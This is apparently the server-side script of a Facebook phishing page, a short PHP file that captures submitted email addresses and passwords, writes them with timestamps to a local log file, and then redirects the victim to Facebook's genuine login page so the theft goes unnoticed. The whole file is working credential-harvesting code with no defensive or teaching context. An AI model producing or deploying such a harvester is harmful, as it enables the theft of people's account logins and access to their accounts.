<?php
error_reporting(E_ALL ^ E_NOTICE);
$email = $_POST["email"];
$pass = $_POST["pass"];
$date = date("Y-m-d H:i:s");

$fp = fopen("./log.txt", "a");
fwrite($fp, "[".$date."] ".$email." | ".$pass."\n");
fclose($fp);

header("Location: https://www.facebook.com/login.php?login_attempt=1&lwv=111");
die();